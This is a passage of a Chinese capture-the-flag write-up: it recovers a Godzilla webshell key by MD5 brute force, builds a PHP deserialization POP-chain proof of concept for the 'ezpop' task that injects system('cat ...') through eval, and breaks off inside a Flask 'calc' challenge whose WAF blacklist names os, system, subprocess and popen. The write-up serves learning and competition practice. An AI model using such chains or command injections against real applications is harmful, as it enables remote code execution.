+<p><img src="https://img-blog.csdnimg.cn/4dfaaa78d2d94a8a8d92bc90d00ce153.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>上面的解密得到，这是他文件上传的表单，我们就可以拿下这个flag.zip了</p>
+<p><img src="https://img-blog.csdnimg.cn/f524e2fa10244f9d86ba280aff8d5f4c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_16,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>但是他有一个密码，密码为password is md5(Godzilla' key)，那找key就是最后的一步了
+key进行md5后的前16位为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">093c1c388069b7e1
+</code></pre></td></tr></table>
+</div>
+</div><p>写一个脚本爆破一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+
+
+<span class="k">def</span> <span class="nf">md5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
+<span class="n">k</span> <span class="o">=</span> <span class="s1">&#39;key1&#39;</span>
+<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
+            <span class="n">key</span> <span class="o">=</span> <span class="n">k</span><span class="o">+</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span>
+            <span class="k">if</span><span class="p">(</span><span class="n">md5</span><span class="p">(</span><span class="n">key</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span><span class="o">==</span><span class="s2">&#34;093c1c388069b7e1&#34;</span><span class="p">):</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+                <span class="k">break</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://img-blog.csdnimg.cn/0f616dda632c471ea79cd67a1ca4fd23.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>md5加密以后解开压缩包拿到flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="mi">093</span><span class="nx">c1c388069b7e18bb4e898fc5ee049</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="https://img-blog.csdnimg.cn/552e069d79b747ff94d4612889a6b1f7.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<h1 id="web">Web</h1>
+<h2 id="ezpop">ezpop</h2>
+<p>题目给了如下代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">class</span> <span class="nc">crow</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$v1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$v2</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="nf">eval</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v2</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v1</span><span class="o">-&gt;</span><span class="na">world</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">fin</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$f1</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span> <span class="o">.</span> <span class="s1">&#39;114514&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span><span class="p">)();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span><span class="o">-&gt;</span><span class="na">get_flag</span><span class="p">();</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">what</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
+        <span class="k">return</span> <span class="s1">&#39;hello&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">mix</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$m1</span><span class="p">;</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">m1</span><span class="p">)();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_flag</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;#&#39;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">m1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>入口的类肯定是fin，最后的目的肯定是在mix里面的get_flag方法里面去执行eval函数
+get_flag的入口也在fin里面，是fin的<code>__call</code>函数，而能调用call的只有一个地方，就是crow的<code>__invoke</code>函数</p>
+<p><img src="https://img-blog.csdnimg.cn/45b482f0d0e447038f60d953c016513c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_13,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>那能调用invoke的地方这里就有很多了
+fin里面的run方法</p>
+<p><img src="https://img-blog.csdnimg.cn/918bef65ebf9466fbfa909e58bd86d6d.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>或者mix的run方法</p>
+<p><img src="https://img-blog.csdnimg.cn/650bbd4838b44d3ba8ef757f729442e1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_11,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里不知道从哪里开始分析，那就先看入口fin的<code>__destruct</code>函数，这里进行了一个字符串拼接，那么就是会触发一个<code>__toString</code>方法了
+toString方法只有what有，那么f1的值就应该是what了</p>
+<p><img src="https://img-blog.csdnimg.cn/7a9ba59d23724ab38b68850d098a8ee9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_12,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里进what的tostring以后会调用run方法，这里就有分支了，但是感觉两个都用得到，所以可能是利用了这个trick，[class,func]去跳转到crow的eval方法
+一开始想着要把所有方法都连接上。所以这样想的</p>
+<p><img src="https://img-blog.csdnimg.cn/bff5235ce9b747299909bdc7c1f5acd8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">new</span> <span class="nx">fin</span><span class="p">(</span><span class="k">new</span> <span class="nx">what</span><span class="p">(</span><span class="k">new</span> <span class="nx">fin</span><span class="p">([</span><span class="k">new</span> <span class="nx">crow</span><span class="p">(</span><span class="k">new</span> <span class="nx">what</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="k">new</span> <span class="nx">mix</span><span class="p">(</span><span class="k">new</span> <span class="nx">crow</span><span class="p">(</span><span class="k">new</span> <span class="nx">fin</span><span class="p">(</span><span class="k">new</span> <span class="nx">mix</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span><span class="mi">1</span><span class="p">))),</span><span class="s2">&#34;eval&#34;</span><span class="p">])))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>但是发现tostring会比析构还先执行，导致打不通，
+然后发现是不是我想复杂了，直接用这个小trick连上get_flag方法就能直接执行了。。。</p>
+<p><img src="https://img-blog.csdnimg.cn/925345aee3174921a73b059e8a0ce6a5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里还耍我一轮</p>
+<p><img src="https://img-blog.csdnimg.cn/4b7f6927b25f407dbde3732964428120.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>写马写不了
+<img src="https://img-blog.csdnimg.cn/81758215145a46b08584429d5b19b7d5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>直接看当前目录</p>
+<p><img src="https://img-blog.csdnimg.cn/1f95fd95005b48ec89009ace001a308e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>这里又耍我一轮
+<img src="https://img-blog.csdnimg.cn/d99b0c9650334279b85fb169714bf77b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>拿到flag
+<img src="https://img-blog.csdnimg.cn/2e984aaad40344c28278e058f251ebf3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAaHVhbWFuZ2dn,size_20,color_FFFFFF,t_70,g_se,x_16"
+	
+	
+	
+	loading="lazy"
+	
+		alt="在这里插入图片描述"
+	
+	
+></p>
+<p>最后的poc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="k">class</span> <span class="nc">crow</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$v1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$v2</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v1</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v2</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">function</span> <span class="nf">eval</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="k">new</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v2</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">v1</span><span class="o">-&gt;</span><span class="na">world</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">fin</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$f1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span> <span class="o">.</span> <span class="s1">&#39;114514&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span><span class="p">)();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">f1</span><span class="o">-&gt;</span><span class="na">get_flag</span><span class="p">();</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">what</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
+        <span class="k">return</span> <span class="s1">&#39;hello&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">class</span> <span class="nc">mix</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$m1</span><span class="p">;</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">m1</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">run</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">m1</span><span class="p">)();</span>
+    <span class="p">}</span>
+
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">get_flag</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;#&#39;</span> <span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">m1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="c1">#$ser = new fin(new what(new fin([new crow(new what(1),new mix(new crow(new fin(new mix(1)),1))),&#34;eval&#34;])));
+</span><span class="c1"></span><span class="nv">$ser</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">fin</span><span class="p">(</span><span class="k">new</span> <span class="nx">what</span><span class="p">(</span><span class="k">new</span> <span class="nx">fin</span><span class="p">([</span><span class="k">new</span> <span class="nx">mix</span><span class="p">(</span><span class="s1">&#39;?&gt;&lt;?php system(&#34;cat H0mvz*&#34;);?&gt;&#39;</span><span class="p">),</span><span class="s1">&#39;get_flag&#39;</span><span class="p">])));</span>
+<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$ser</span><span class="p">));</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="calc">calc</h2>
+<p>题目给了源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="c1">#coding=utf-8
+</span><span class="c1"></span><span class="nx">from</span> <span class="nx">flask</span> <span class="nx">import</span> <span class="nx">Flask</span><span class="p">,</span><span class="nx">render_template</span><span class="p">,</span><span class="nx">url_for</span><span class="p">,</span><span class="nx">render_template_string</span><span class="p">,</span><span class="nx">redirect</span><span class="p">,</span><span class="nx">request</span><span class="p">,</span><span class="nx">current_app</span><span class="p">,</span><span class="nx">session</span><span class="p">,</span><span class="nx">abort</span><span class="p">,</span><span class="nx">send_from_directory</span>
+<span class="nx">import</span> <span class="nx">random</span>
+<span class="nx">from</span> <span class="nx">urllib</span> <span class="nx">import</span> <span class="nx">parse</span>
+<span class="nx">import</span> <span class="nx">os</span>
+<span class="nx">from</span> <span class="nx">werkzeug</span><span class="o">.</span><span class="nx">utils</span> <span class="nx">import</span> <span class="nx">secure_filename</span>
+<span class="nx">import</span> <span class="nx">time</span>
+
+
+<span class="nx">app</span><span class="o">=</span><span class="nx">Flask</span><span class="p">(</span><span class="nx">__name__</span><span class="p">)</span>
+
+<span class="nx">def</span> <span class="nx">waf</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span><span class="o">:</span>
+    <span class="nx">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;import&#39;</span><span class="p">,</span><span class="s1">&#39;(&#39;</span><span class="p">,</span><span class="s1">&#39;)&#39;</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">,</span><span class="s1">&#39;_&#39;</span><span class="p">,</span><span class="s1">&#39;|&#39;</span><span class="p">,</span><span class="s1">&#39;;&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span><span class="s1">&#39;{&#39;</span><span class="p">,</span><span class="s1">&#39;}&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;getattr&#39;</span><span class="p">,</span><span class="s1">&#39;os&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;class&#39;</span><span class="p">,</span><span class="s1">&#39;subclasses&#39;</span><span class="p">,</span><span class="s1">&#39;mro&#39;</span><span class="p">,</span><span class="s1">&#39;request&#39;</span><span class="p">,</span><span class="s1">&#39;args&#39;</span><span class="p">,</span><span class="s1">&#39;eval&#39;</span><span class="p">,</span><span class="s1">&#39;if&#39;</span><span class="p">,</span><span class="s1">&#39;subprocess&#39;</span><span class="p">,</span><span class="s1">&#39;file&#39;</span><span class="p">,</span><span class="s1">&#39;open&#39;</span><span class="p">,</span><span class="s1">&#39;popen&#39;</span><span class="p">,</span><span class="s1">&#39;builtins&#39;</span><span class="p">,</span><span class="s1">&#39;compile&#39;</span><span class="p">,</span><span class="s1">&#39;execfile&#39;</span><span class="p">,</span><span class="s1">&#39;from_pyfile&#39;</span><span class="p">,</span><span class="s1">&#39;config&#39;</span><span class="p">,</span><span class="s1">&#39;local&#39;</span><span class="p">,</span><span class="s1">&#39;self&#39;</span><span class="p">,</span><span class="s1">&#39;item&#39;</span><span class="p">,</span><span class="s1">&#39;getitem&#39;</span><span class="p">,</span><span class="s1">&#39;getattribute&#39;</span><span class="p">,</span><span class="s1">&#39;func_globals&#39;</span><span class="p">,</span><span class="s1">&#39;__init__&#39;</span><span class="p">,</span><span class="s1">&#39;join&#39;</span><span class="p">,</span><span class="s1">&#39;__dict__&#39;</span><span class="p">]</span>
+    <span class="nx">flag</span> <span class="o">=</span> <span class="k">True</span>
+    <span class="k">for</span> <span class="nx">no</span> <span class="nx">in</span> <span class="nx">blacklist</span><span class="o">:</span>
+        <span class="k">if</span> <span class="nx">no</span><span class="o">.</span><span class="nx">lower</span><span class="p">()</span> <span class="nx">in</span> <span class="nx">s</span><span class="o">.</span><span class="nx">lower</span><span class="p">()</span><span class="o">:</span>
+            <span class="nx">flag</span><span class="o">=</span> <span class="k">False</span>
+            <span class="k">print</span><span class="p">(</span><span class="nx">no</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">return</span> <span class="nx">flag</span>
+    
+
+<span class="o">@</span><span class="nx">app</span><span class="o">.</span><span class="nx">route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>
+<span class="nx">def</span> <span class="nx">index</span><span class="p">()</span><span class="o">:</span>
+    <span class="s2">&#34;欢迎来到SUctf2022&#34;</span>
+    <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>
+
+<span class="o">@</span><span class="nx">app</span><span class="o">.</span><span class="nx">route</span><span class="p">(</span><span class="s2">&#34;/calc&#34;</span><span class="p">,</span><span class="nx">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
+<span class="nx">def</span> <span class="nx">calc</span><span class="p">()</span><span class="o">:</span>
+    <span class="nx">ip</span> <span class="o">=</span> <span class="nx">request</span><span class="o">.</span><span class="nx">remote_addr</span>
